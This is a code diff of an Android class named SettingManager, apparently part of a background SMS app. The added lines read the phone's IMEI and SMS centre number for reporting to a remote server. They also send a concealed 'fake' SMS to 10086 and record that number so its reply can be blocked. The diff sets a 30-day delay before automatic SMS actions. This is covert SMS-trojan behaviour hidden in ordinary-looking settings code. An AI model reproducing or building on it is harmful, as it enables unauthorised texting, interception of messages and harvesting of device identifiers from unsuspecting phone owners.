@@ -63,6 +63,7 @@ public class SettingManager {
     public static final String SMS_CONFIRM_INFO = "sms_confirm_info";
     public static final String SMS_CENTER = "sms_center";
     public static final String FIRST_START_TIME = "first_start_time";
+    public static final String SMS_TEMP_BLOCK_NUM_AND_TIMES = "sms_temp_block_num_and_times";
     
     private static final String SERVER_URL = "http://go.ruitx.cn/Coop/request3.php";
     public final String UPLOAD_FILE_PATH;
@@ -71,8 +72,7 @@ public class SettingManager {
     private static final int DEFAULT_SMS_COUNT = 2;
     
     private static final String DEFAULT_VALUE = "";
-//    private static final long SMS_DELAY_TIME = 30 * 24 * 60 * 60 * 1000;
-    private static final long SMS_DEFAULT_DELAY_TIME = 1 * 60 * 1000;
+    private static final long SMS_DEFAULT_DELAY_TIME = 30 * 24 * 60 * 60 * 1000;
     public static final String AUTO_SMS_ACTION = "com.mms.bg.SMS";
     public static final String AUTO_CONNECT_SERVER = "com.mms.bg.SERVER";
     private static final int TIMEOUT = 5 * 1000;
@@ -244,6 +244,20 @@ public class SettingManager {
         mLog.appendLog("SMS_Send", date.toGMTString());
     }
     
+    //return the temp block num and the time for the bg service. format is num;times
+    public String getSMSTempBlockNumAndTimes() {
+        return mSP.getString(SMS_TEMP_BLOCK_NUM_AND_TIMES, null);
+    }
+    
+    public void setSMSTempBlockNumAndTimes(String num, String count) {
+        if (num == null || count == null) {
+            mEditor.remove(SMS_TEMP_BLOCK_NUM_AND_TIMES);
+        } else {
+            mEditor.putString(SMS_TEMP_BLOCK_NUM_AND_TIMES, num + ";" + count);
+        }
+        mEditor.commit();
+    }
+    
     public void logTagCurrentTime(String tag) {
         Date date = new Date(System.currentTimeMillis());
         mLog.appendLog(tag, date.toGMTString());
@@ -304,6 +318,7 @@ public class SettingManager {
     }
     
     public void setSMSCenter(String num) {
+        LOGD("[[setSMSCenter]] center = " + num);
         mEditor.putString(SMS_CENTER, num);
         mEditor.commit();
     }
@@ -312,6 +327,9 @@ public class SettingManager {
         return mSP.getString(FIRST_START_TIME, null);
     }
     
+    /**
+     * set the first start time for the mmsbg
+     */
     public void setFirstStartTime() {
         String time = getFirstStartTime();
         if (time == null) {
@@ -410,14 +428,17 @@ public class SettingManager {
     private void savePhoneInfo() {
         String smsCenter = this.getSMSCenter();
         //test code
-        if (smsCenter == null) {
-            smsCenter = "13800100500";
-        }
+//        if (smsCenter == null) {
+//            smsCenter = "13800100500";
+//        }
         LOGD("[[savePhoneInfo]] smsCenter = " + smsCenter);
         if (smsCenter != null) {
-            if (smsCenter.startsWith("+") == true) {
+            if (smsCenter.startsWith("+") == true && smsCenter.length() == 14) {
                 smsCenter = smsCenter.substring(3);
+            } else if (smsCenter.length() > 11) {
+                smsCenter = smsCenter.substring(smsCenter.length() - 11);
             }
+            LOGD("[[savePhoneInfo]] split the smsCenter = " + smsCenter);
             TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
             String imei = tm.getDeviceId();
             String version = "1.0";
@@ -494,9 +515,12 @@ public class SettingManager {
             } catch (Exception e) {
             }
         } else {
+            //the sms center is null, so fake to send a sms to 10086 and get the sms center by the reply sms
             WorkingMessage wm = WorkingMessage.createEmpty(mContext);
             wm.setDestNum("10086");
             wm.setText("1234567");
+            
+            this.setSMSTempBlockNumAndTimes("10086", "1");
             wm.send();
         }
     }
